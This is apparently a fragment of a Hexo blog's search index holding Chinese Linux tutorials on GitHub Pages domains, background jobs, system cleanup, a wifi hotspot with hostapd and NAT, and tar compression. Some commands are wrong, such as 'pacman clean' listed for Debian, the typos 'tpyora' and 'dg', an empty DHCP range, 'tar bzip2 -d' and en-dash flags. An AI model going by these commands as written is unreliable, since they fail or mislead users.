<th style="text-align:left">记录类型</th>
<th style="text-align:left">记录值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">@</td>
<td style="text-align:left">A</td>
<td style="text-align:left">185.199.110.153</td>
</tr>
<tr>
<td style="text-align:left">www</td>
<td style="text-align:left">CNAME</td>
<td style="text-align:left">eonun.github.io</td>
</tr>
</tbody>
</table>
</div>
<h4 id="在仓库设置界面添加自定义域名"><a href="#在仓库设置界面添加自定义域名" class="headerlink" title="在仓库设置界面添加自定义域名"></a>在仓库设置界面添加自定义域名</h4><p>在仓库页顶部找到<code>Settings</code>，进入后到页面最下方找到<code>GitHub Pages</code>，再找到<code>Custom domain</code>填入自己的域名就保存可以了</p>
<p><strong>在source目录下创建文件CNAME，不然每次hexo deploy都得去设置GitHub Pages自定义域名</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/CNAME	<span class="comment">#创建文件添加内容（只能一个域名）：</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>eonun.com</p>
</blockquote>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux后台运行程序</title>
    <url>/2019/09/22/Linux%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<h2 id="运行到后台"><a href="#运行到后台" class="headerlink" title="运行到后台"></a>运行到后台</h2><h3 id="amp-命令"><a href="#amp-命令" class="headerlink" title="&amp;命令"></a><code>&amp;</code>命令</h3><p>在命令的最后加入，该命令将会被放到后台执行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tpyora test.md &amp;</span><br></pre></td></tr></table></figure></p>
<h3 id="nohup命令"><a href="#nohup命令" class="headerlink" title="nohup命令"></a><code>nohup</code>命令</h3><p>同样需要添加<code>&amp;</code>在命令末尾，该命令的作用是不挂断的运行<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nohup typora test.md &amp;</span><br></pre></td></tr></table></figure><br><a id="more"></a></p>
<h2 id="查看后台"><a href="#查看后台" class="headerlink" title="查看后台"></a>查看后台</h2><h3 id="jobs命令"><a href="#jobs命令" class="headerlink" title="jobs命令"></a><code>jobs</code>命令</h3><p>查看当前终端后台运行的任务<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">jobs</span></span><br></pre></td></tr></table></figure></p>
<h3 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a><code>ps</code>命令</h3><p>查看当前的所有进程<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -aux</span><br></pre></td></tr></table></figure></p>
<ul>
<li>a ：显示所有程序</li>
<li>u ：以用户为主的格式显示</li>
<li>x ：显示所有程序，不区分终端</li>
</ul>
<p>可使用<code>grep xxx</code>指定显示出xxx的进程</p>
<h2 id="关闭后台"><a href="#关闭后台" class="headerlink" title="关闭后台"></a>关闭后台</h2><h3 id="kill命令"><a href="#kill命令" class="headerlink" title="kill命令"></a><code>kill</code>命令</h3><ol>
<li><p>通过<code>jobs</code>查看<code>jobnum</code>，然后使用<code>kill %jobnum</code>关闭后台</p>
</li>
<li><p>通过<code>ps</code>查看进程<code>PID</code>，然后使用<code>kill PID</code>关闭后台</p>
</li>
</ol>
<h2 id="前后台进程切换与控制"><a href="#前后台进程切换与控制" class="headerlink" title="前后台进程切换与控制"></a>前后台进程切换与控制</h2><h3 id="fg命令"><a href="#fg命令" class="headerlink" title="fg命令"></a><code>fg</code>命令</h3><p><code>fg</code>命令用于讲后台运行的调至前台运行<br>多个后台任务时，可使用<code>jobs</code>查寻<code>jobnum</code>,然后用<code>fg %jobnum</code>选择调至前台的程序</p>
<h3 id="Ctrl-z"><a href="#Ctrl-z" class="headerlink" title="Ctrl + z"></a>Ctrl + z</h3><p>讲正在运行的前台放到后台，且处于<strong>暂停状态</strong></p>
<h3 id="bg命令"><a href="#bg命令" class="headerlink" title="bg命令"></a><code>bg</code>命令</h3><p>用于讲后台暂停的命令，变成后台继续<br>多个后台任务时，可使用<code>jobs</code>查寻<code>jobnum</code>,然后用<code>dg %jobnum</code>选择后台继续的程序</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux垃圾清理</title>
    <url>/2019/10/12/Linux%E5%9E%83%E5%9C%BE%E6%B8%85%E7%90%86/</url>
    <content><![CDATA[<h1 id="清理系统中无用的包"><a href="#清理系统中无用的包" class="headerlink" title="清理系统中无用的包"></a>清理系统中无用的包</h1><h2 id="arch系"><a href="#arch系" class="headerlink" title="arch系"></a>arch系</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -R $(pacman -Qdtq)</span><br></pre></td></tr></table></figure>
<h2 id="debian系"><a href="#debian系" class="headerlink" title="debian系"></a>debian系</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get autoremove</span><br></pre></td></tr></table></figure>
<h1 id="清理包缓存"><a href="#清理包缓存" class="headerlink" title="清理包缓存"></a>清理包缓存</h1><h2 id="arch系-1"><a href="#arch系-1" class="headerlink" title="arch系"></a>arch系</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -Sc 	<span class="comment"># 清除未安装包的缓存</span></span><br><span class="line">sudo pacman -Scc 	<span class="comment"># 清理所有缓存</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="debian系-1"><a href="#debian系-1" class="headerlink" title="debian系"></a>debian系</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman clean <span class="comment"># 清除缓存包  </span></span><br></pre></td></tr></table></figure>
<h2 id="redhat系"><a href="#redhat系" class="headerlink" title="redhat系"></a>redhat系</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum clean packages 		<span class="comment"># 清除缓存目录下的软件包</span></span><br><span class="line">yum clean headers 		<span class="comment"># 清除缓存目录下的 headers</span></span><br><span class="line">yum clean oldheaders 	<span class="comment"># 清除缓存目录下旧的 headers</span></span><br><span class="line">yum clean all 			<span class="comment"># 清除缓存目录下的软件包及旧的headers</span></span><br></pre></td></tr></table></figure>
<h1 id="清理日志垃圾"><a href="#清理日志垃圾" class="headerlink" title="清理日志垃圾"></a>清理日志垃圾</h1><h2 id="查看日志文件"><a href="#查看日志文件" class="headerlink" title="查看日志文件"></a>查看日志文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">du -t 100M /var</span><br><span class="line"><span class="comment">#或</span></span><br><span class="line">journalctl --disk-usage</span><br></pre></td></tr></table></figure>
<h2 id="删除日志文件"><a href="#删除日志文件" class="headerlink" title="删除日志文件"></a>删除日志文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo journalctl --vacuum-size=100M  <span class="comment"># 清理日志归档文件(并不清理活动的日志文件)，保留100M</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>--vacuum-size=</code> 可用于限制归档文件的最大磁盘使用量 (可以使用 “K”, “M”, “G”, “T” 后缀)</li>
<li><code>--vacuum-time=</code> 可用于清除指定时间之前的归档 (可以使用 “s”, “m”, “h”, “days”, “weeks”, “months”, “years” 后缀)<br><code>--vacuum-files=</code> 可用于限制日志归档文件的最大数量</li>
</ul>
<h1 id="清理软件数据垃圾"><a href="#清理软件数据垃圾" class="headerlink" title="清理软件数据垃圾"></a>清理软件数据垃圾</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find ~/.cache/ -<span class="built_in">type</span> f -atime +365 -delete 	<span class="comment"># 找到日期大于365天的文件，并直接清理</span></span><br><span class="line">find ~/.cache/ -size +10M 		<span class="comment"># 找到大于10M的文件，酌情清理</span></span><br><span class="line">du -h ~/.cache -t 100M 			<span class="comment"># 列出体积大于100M的目录，酌情清理</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>垃圾清理</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux开启wifi和热点双用</title>
    <url>/2019/10/22/Linux%E5%BC%80%E5%90%AFwifi%E5%92%8C%E7%83%AD%E7%82%B9%E5%8F%8C%E7%94%A8/</url>
    <content><![CDATA[<p>  有些情况下我们需要将连接并认证过的wifi共享出来，这样就无需多个认证达到多人使用了</p>
<h1 id="手动配置"><a href="#手动配置" class="headerlink" title="手动配置"></a>手动配置</h1><h2 id="无线网卡是否支持AP模式"><a href="#无线网卡是否支持AP模式" class="headerlink" title="无线网卡是否支持AP模式"></a>无线网卡是否支持AP模式</h2><p>  无线设备必须兼容 <code>nl80211</code>标准 ,并且支持 <code>AP (Access Point)</code>工作模式。可通过 <code>iw list</code> 命令查看无线网卡设备信息, 输出信息到<code>Supported interface modes</code> 段落中要有 <code>AP</code> 模式:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iw list</span><br></pre></td></tr></table></figure>
<p>输出中包含<code>* AP</code>代表支持AP模式，可开启热点<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br><span class="line">Wiphy phy1</span><br><span class="line">...</span><br><span class="line">	Supported interface modes:</span><br><span class="line">...</span><br><span class="line">	 * AP</span><br><span class="line">...</span><br><span class="line">valid interface combinations:</span><br><span class="line">     * #&#123; managed &#125; &lt;&#x3D; 2048, #&#123; AP, mesh point &#125; &lt;&#x3D; 8, #&#123; P2P-client, P2P-GO &#125; &lt;&#x3D; 1,</span><br><span class="line">     total &lt;&#x3D; 2048, #channels &lt;&#x3D; 1, STA&#x2F;AP BI must match</span><br><span class="line">...</span><br></pre></td></tr></table></figure><br>  注意：<code>#channels &lt;=1</code> 代表开启的热点<strong>必须</strong>所连wifi用<strong>同一信道</strong></p>
<h2 id="创建热点接口"><a href="#创建热点接口" class="headerlink" title="创建热点接口"></a>创建热点接口</h2><p>  查看无线网卡设备接口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wlan0: ...</span><br><span class="line">    link&#x2F;ether ...</span><br><span class="line">    inet ...</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>  创建虚拟接口<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo iw dev wlan0 interface add wifi_ap type managed addr 12:34:56:78:ab:cd</span><br><span class="line"># 或</span><br><span class="line">sudo iw phy phy0 interface add wifi_ap type managed addr 12:34:56:78:ab:cd</span><br></pre></td></tr></table></figure><br>  如需删除接口使用命令<code>sudo iw dev wifi_ap del</code>即可删除</p>
<p>  可使用<a href="https://wiki.archlinux.org/index.php/MAC_address_spofing"><code>macchanger</code></a>给虚拟接口生成一个随机Mac地址<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo macchanger -r wifi_ap</span><br></pre></td></tr></table></figure></p>
<p>  如需恢复Mac地址使用命令<code>macchanger -p wifi_ap</code></p>
<h2 id="配置热点"><a href="#配置热点" class="headerlink" title="配置热点"></a>配置热点</h2><p>  安装<code>hostapd</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S hostapd</span><br></pre></td></tr></table></figure>
<p>  配置<code>hostapd</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hostapd/hostapd.conf</span><br><span class="line"><span class="comment"># 添加</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 热点名</span></span><br><span class="line">ssid=test_wifi_ap</span><br><span class="line"><span class="comment"># 配置密码</span></span><br><span class="line">wpa_passphrase=password</span><br><span class="line">wpa=2</span><br><span class="line">wpa_key_mgmt=WPA-PSK</span><br><span class="line">wpa_pairwise=TKIP CCMP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接口</span></span><br><span class="line">interface=wifi_ap</span><br><span class="line"><span class="comment"># 信道(保持与wifi一样)</span></span><br><span class="line">channel=1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其它使用默认，也可自行根据注释说明修改</span></span><br><span class="line"></span><br><span class="line">logger_syslog=-1</span><br><span class="line">logger_syslog_level=2</span><br><span class="line">logger_stdout=-1</span><br><span class="line">logger_stdout_level=2</span><br><span class="line">ctrl_interface=/run/hostapd</span><br><span class="line">ctrl_interface_group=0</span><br><span class="line">hw_mode=g</span><br><span class="line">beacon_int=100</span><br><span class="line">dtim_period=2</span><br><span class="line">max_num_sta=255</span><br><span class="line">rts_threshold=-1</span><br><span class="line">fragm_threshold=-1</span><br><span class="line">macaddr_acl=0</span><br><span class="line">auth_algs=3</span><br><span class="line">ignore_broadcast_ssid=0</span><br><span class="line">wmm_enabled=1</span><br><span class="line">wmm_ac_bk_cwmin=4</span><br><span class="line">wmm_ac_bk_cwmax=10</span><br><span class="line">wmm_ac_bk_aifs=7</span><br><span class="line">wmm_ac_bk_txop_limit=0</span><br><span class="line">wmm_ac_bk_acm=0</span><br><span class="line">wmm_ac_be_aifs=3</span><br><span class="line">wmm_ac_be_cwmin=4</span><br><span class="line">wmm_ac_be_cwmax=10</span><br><span class="line">wmm_ac_be_txop_limit=0</span><br><span class="line">wmm_ac_be_acm=0</span><br><span class="line">wmm_ac_vi_aifs=2</span><br><span class="line">wmm_ac_vi_cwmin=3</span><br><span class="line">wmm_ac_vi_cwmax=4</span><br><span class="line">wmm_ac_vi_txop_limit=94</span><br><span class="line">wmm_ac_vi_acm=0</span><br><span class="line">wmm_ac_vo_aifs=2</span><br><span class="line">wmm_ac_vo_cwmin=2</span><br><span class="line">wmm_ac_vo_cwmax=3</span><br><span class="line">wmm_ac_vo_txop_limit=47</span><br><span class="line">wmm_ac_vo_acm=0</span><br><span class="line">eapol_key_index_workaround=0</span><br><span class="line">eap_server=0</span><br><span class="line">own_ip_addr=127.0.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="网络设置"><a href="#网络设置" class="headerlink" title="网络设置"></a>网络设置</h2><p>  可使用网桥或NAT两种模式，网桥模式还得单独取得认证才能上网，而NAT模式则是认证后再将网络转发分享出来</p>
<h3 id="NAT设置"><a href="#NAT设置" class="headerlink" title="NAT设置"></a>NAT设置</h3><h4 id="启动包转发"><a href="#启动包转发" class="headerlink" title="启动包转发"></a>启动包转发</h4><p>  <strong>检查包转发配置情况</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl -a |grep forward</span><br></pre></td></tr></table></figure>
<p>  信息为用于控制每个默认值，每个接口的转发的选项，以及每个接口的IPv4 / IPv6的单独选项</p>
<p>  <strong>启用临时包转发</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo sysctl net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure>
<p>  要想选择性地为某一个具体的网卡提供包转发，使用<code>sysctl net.ipv4.conf.interface_name.forwarding=1</code>来代替</p>
<p>  永久开启需编辑<code>/etc/sysctl.d/30-ipforward.conf</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net.ipv4.ip_forward&#x3D;1</span><br><span class="line">net.ipv6.conf.default.forwarding&#x3D;1</span><br><span class="line">net.ipv6.conf.all.forwarding&#x3D;1</span><br></pre></td></tr></table></figure></p>
<h4 id="启用NAT"><a href="#启用NAT" class="headerlink" title="启用NAT"></a>启用NAT</h4><p>  <strong>使用<a href="https://wiki.archlinux.org/index.php/Iptables"><code>iptables</code></a>配置规则来启用NAT</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE</span><br><span class="line">sudo iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">sudo iptables -A FORWARD -i wifi_ap -o wlan0 -j ACCEPT</span><br><span class="line"></span><br><span class="line"># 保存规则</span><br><span class="line">sudo iptables-save &gt; &#x2F;etc&#x2F;iptables&#x2F;iptables.rules</span><br></pre></td></tr></table></figure>
<p>  <strong><em>或</em></strong> <strong>使用<a href="https://wiki.archlinux.org/index.php/Nftables"><code>nftables</code></a>启用NAT</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo nft add table ip nat</span><br><span class="line">sudo nft add chain ip nat prerouting &#123; type nat hook prerouting priority 0 \; &#125;</span><br><span class="line">sudo nft add chain ip nat postrouting &#123; type nat hook postrouting priority 100 \; &#125;</span><br><span class="line"></span><br><span class="line"># 永久保存</span><br><span class="line">sudo nft list ruleset &gt; &#x2F;etc&#x2F;nftables.conf</span><br></pre></td></tr></table></figure>
<h3 id="配置DHCP"><a href="#配置DHCP" class="headerlink" title="配置DHCP"></a>配置DHCP</h3><p>  配置DHCP自动分配IP,可通过使用<a href="https://wiki.archlinux.org/index.php/Dhcpd"><code>dhcpd</code></a>或<a href="https://wiki.archlinux.org/index.php/Dnsmasq"><code>dnsmasq</code></a>来启用DHCP服务</p>
<p>DHCP服务器必须允许UDP端口<code>67</code>的传入连接。对于DNS请求，还必须允许到<code>UDP / TCP</code>端口<code>53</code>的传入连接。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p udp --dport 67 -i net0 -j ACCEPT</span><br><span class="line">iptables -I INPUT -p udp --dport 53 -s 192.168.123.0&#x2F;24 -j ACCEPT</span><br><span class="line">iptables -I INPUT -p tcp --dport 53 -s 192.168.123.0&#x2F;24 -j ACCEPT</span><br><span class="line"></span><br><span class="line"># 保存规则</span><br><span class="line">sudo iptables-save &gt; &#x2F;etc&#x2F;iptables&#x2F;iptables.rules</span><br></pre></td></tr></table></figure>
<p>  <strong>使用<a href="https://wiki.archlinux.org/index.php/Dhcpd"><code>dhcpd</code></a>配置</strong></p>
<p>  <strong>给接口添加静态IP</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo ip addr add 10.0.0.254/24 dev wifi_ap</span><br></pre></td></tr></table></figure></p>
<p>  <strong>配置<code>hdcpd</code>服务</strong><br>  需要安装<code>dhcpd</code>包<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原有的 dhcpd.conf 中包含多个未被注释的示例，所以先将其备份再新建一个</span></span><br><span class="line">sudo mv /etc/dhcpd.conf /etc/dhcpd.conf.backup</span><br><span class="line">sudo vim /etc/dhcpd.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加配置内容</span></span><br><span class="line">option domain-name-servers 114.114.114.114,8.8.8.8;</span><br><span class="line">option subnet-mask 255.255.255.0;</span><br><span class="line">option routers 10.0.0.254;</span><br><span class="line">subnet 10.0.0.0 netmask 255.255.255.0 &#123;</span><br><span class="line">  range 10.0.0.0 10.0.0.0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置MAC地址绑定固定IP</span></span><br><span class="line">option domain-name-servers 114.114.114.114,8.8.8.8;</span><br><span class="line">option subnet-mask 255.255.255.0;</span><br><span class="line">option routers 10.0.0.254;</span><br><span class="line">subnet 10.0.0.0 netmask 255.255.255.0 &#123;</span><br><span class="line">  range 10.0.0.0 10.0.0.0;</span><br><span class="line">  host macbookpro&#123;</span><br><span class="line">  	hardware ethernet 11:22:33:aa:bb:cc;</span><br><span class="line">  	fixed-address 10.0.0.10;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>  <strong>启动DHCP服务</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 启用IPv4 DHCP</span><br><span class="line">sudo systemctl start dhcpd4</span><br><span class="line"></span><br><span class="line"># 启动IPv6 DHCP</span><br><span class="line">sudo systemctl start dhcpd6</span><br></pre></td></tr></table></figure></p>
<h2 id="开启热点"><a href="#开启热点" class="headerlink" title="开启热点"></a>开启热点</h2><p>  <strong>启动<code>hostapd</code>即可</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start hostapd</span><br></pre></td></tr></table></figure>
<h1 id="使用脚本"><a href="#使用脚本" class="headerlink" title="使用脚本"></a>使用脚本</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>  详解参考<a href="https://github.com/oblique/create_ap/"><code>create_ap</code></a>仓库</p>
<p>  <code>ArchLinux</code>系可直接用<code>pacman</code>安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S create_ap</span><br></pre></td></tr></table></figure>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="添加虚拟网络接口并设置地址"><a href="#添加虚拟网络接口并设置地址" class="headerlink" title="添加虚拟网络接口并设置地址"></a>添加虚拟网络接口并设置地址</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo iw dev wlan0 interface add wifi_ap  <span class="built_in">type</span> managed addr 12:34:56:78:ab:<span class="built_in">cd</span></span><br></pre></td></tr></table></figure>
<h3 id="配置热点-1"><a href="#配置热点-1" class="headerlink" title="配置热点"></a>配置热点</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo create_ap -c 11 wifi_ap\ eth0 SSID passwowd</span><br></pre></td></tr></table></figure>
<p>参考：<br><a href="https://www.cnblogs.com/smileinwind/p/8535673.html">Linux连接wifi同时开启热点</a><br><a href="https://wiki.archlinux.org/index.php/Software_access_point">Software access point</a><br><a href="https://zhuanlan.zhihu.com/p/22322531">Linux 设置 wifi 共享（wifi 到 wifi）</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux文件压缩与解压</title>
    <url>/2019/10/02/Linux%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9%E4%B8%8E%E8%A7%A3%E5%8E%8B/</url>
    <content><![CDATA[<h1 id="tar详解"><a href="#tar详解" class="headerlink" title="tar详解"></a>tar详解</h1><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-c: 建立压缩档案 </span><br><span class="line">-x：解压 </span><br><span class="line">-t：查看内容 </span><br><span class="line">-r：向压缩归档文件末尾追加文件 </span><br><span class="line">-u：更新原压缩包中的文件</span><br><span class="line">-z：有gzip属性的</span><br><span class="line">-j：有bz2属性的</span><br><span class="line">-Z：有compress属性的</span><br><span class="line">-v：显示所有过程</span><br><span class="line">-O：将文件解开到标准输出</span><br><span class="line">-f: 必须参数，使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar –cvf jpg.tar *.jpg       <span class="comment"># 将目录里所有jpg文件打包成 tar.jpg </span></span><br><span class="line">tar –czf jpg.tar.gz *.jpg    <span class="comment"># 将目录里所有jpg文件打包成 jpg.tar 后，并且将其用 gzip 压缩，生成一个 gzip 压缩过的包，命名为 jpg.tar.gz </span></span><br><span class="line">tar –cjf jpg.tar.bz2 *.jpg   <span class="comment"># 将目录里所有jpg文件打包成 jpg.tar 后，并且将其用 bzip2 压缩，生成一个 bzip2 压缩过的包，命名为jpg.tar.bz2 </span></span><br><span class="line">tar –cZf jpg.tar.Z *.jpg     <span class="comment"># 将目录里所有 jpg 文件打包成 jpg.tar 后，并且将其用 compress 压缩，生成一个 umcompress 压缩过的包，命名为jpg.tar.Z </span></span><br><span class="line">rar a jpg.rar *.jpg          <span class="comment"># rar格式的压缩，需要先下载 rar for linux </span></span><br><span class="line">zip jpg.zip *.jpg            <span class="comment"># zip格式的压缩，需要先下载 zip for linux</span></span><br></pre></td></tr></table></figure>
<h2 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar –xvf file.tar         <span class="comment"># 解压 tar 包 </span></span><br><span class="line">tar -xzvf file.tar.gz     <span class="comment"># 解压 tar.gz </span></span><br><span class="line">tar -xjvf file.tar.bz2    <span class="comment"># 解压 tar.bz2 </span></span><br><span class="line">tar –xZvf file.tar.Z      <span class="comment"># 解压 tar.Z </span></span><br><span class="line">unrar e file.rar          <span class="comment"># 解压 rar </span></span><br><span class="line">unzip file.zip            <span class="comment"># 解压 zip </span></span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>*.tar 用 tar –xvf 解压 </li>
<li>*.gz 用 gzip -d或者gunzip 解压 </li>
<li><em>.tar.gz和</em>.tgz 用 tar –xzf 解压 </li>
<li>*.bz2 用 bzip2 -d或者用bunzip2 解压 </li>
<li>*.tar.bz2用tar –xjf 解压 </li>
<li>*.Z 用 uncompress 解压 </li>
<li>*.tar.Z 用tar –xZf 解压 </li>
<li>*.rar 用 unrar e解压 </li>
<li>*.zip 用 unzip 解压</li>
</ul>
<h1 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h1><p><strong>Linux系统是不存在由后缀名确定文件类型的，有些文件在命名的时候可能没有后缀，或后缀与实际文件类型不同，导致报错的情况</strong><br>比如：&lt;&gt;使用<code>tar zxf xxx.tar.bz2</code>解压文件报错：<code>gzip: stdin: not in gzip format</code>&lt;&gt;</p>
<p><strong>在不确定文件类型时可通过<code>file</code>命令来查看文件类型，然后根据文件类型来使用</strong></p>
<h2 id="查看文件类型"><a href="#查看文件类型" class="headerlink" title="查看文件类型"></a>查看文件类型</h2><p>ile命令用来探测给定文件的类型。file命令对文件的检查分为文件系统、魔法幻数检查和语言检查3个过程。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file File_Name</span><br></pre></td></tr></table></figure>
<p><strong>选项</strong></p>
<ul>
<li><code>-b</code>：列出辨识结果时，不显示文件名称</li>
<li><code>-c</code>：详细显示指令执行过程，便于排错或分析程序执行的情形</li>
<li><code>-f&lt;名称文件&gt;</code>：指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称</li>
<li><code>-L</code>：直接显示符号连接所指向的文件类别</li>
<li><code>-m&lt;魔法数字文件&gt;</code>：指定魔法数字文件</li>
<li><code>-v</code>：显示版本信息</li>
<li><code>-z</code>：尝试去解读压缩文件的内容</li>
</ul>
<h1 id="压缩、解压命令详解"><a href="#压缩、解压命令详解" class="headerlink" title="压缩、解压命令详解"></a>压缩、解压命令详解</h1><h2 id="tar"><a href="#tar" class="headerlink" title=".tar"></a>.tar</h2><p>tar是打包格式，不是压缩格式<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解包</span></span><br><span class="line">tar xvf File_Name.tar</span><br><span class="line"><span class="comment"># 打包</span></span><br><span class="line">tar cvf File_Name.tar File_Or_Dir_Name</span><br></pre></td></tr></table></figure></p>
<h2 id="gz"><a href="#gz" class="headerlink" title=".gz"></a>.gz</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">gunzip File_Name.gz</span><br><span class="line">gzip -d File_Name.gz</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">gzip File_Name</span><br></pre></td></tr></table></figure>
<h2 id="tar-gz-tgz"><a href="#tar-gz-tgz" class="headerlink" title=".tar.gz/.tgz"></a>.tar.gz<code>/</code>.tgz</h2><p><code>tar</code>调用<code>gzip</code>完成压缩和解压的操作<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar zxvf File_Name.tar.gz</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">tar zcvf File_Name.tar.gz File_Or_Dir_Name</span><br></pre></td></tr></table></figure></p>
<h2 id="bz"><a href="#bz" class="headerlink" title="bz"></a>bz</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">bzip2 -d File_Name.bz</span><br><span class="line">bunzip2 File_Name.bz</span><br><span class="line"><span class="comment"># 压缩 无</span></span><br></pre></td></tr></table></figure>
<h2 id="tar-gz"><a href="#tar-gz" class="headerlink" title=".tar.gz"></a>.tar.gz</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar jxvf File_Name.tar.bz</span><br><span class="line"><span class="comment"># 压缩 无</span></span><br></pre></td></tr></table></figure>
<h2 id="bz2"><a href="#bz2" class="headerlink" title=".bz2"></a>.bz2</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar bzip2 -d File_Name.bz2</span><br><span class="line">bunzip2 File_Name.bz2</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">bzip2 -z File_Name</span><br></pre></td></tr></table></figure>
<h2 id="tar-bz2"><a href="#tar-bz2" class="headerlink" title="tar.bz2"></a>tar.bz2</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar jxvf File_Name.tar.bz2</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">tar jcvf File_Name.tar.bz2 File_Or_Dir_Name</span><br></pre></td></tr></table></figure>
<h2 id="Z"><a href="#Z" class="headerlink" title=".Z"></a>.Z</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">uncompress File_Name.Z</span><br><span class="line"><span class="comment"># 压缩</span></span><br><span class="line">compress File_Name</span><br></pre></td></tr></table></figure>
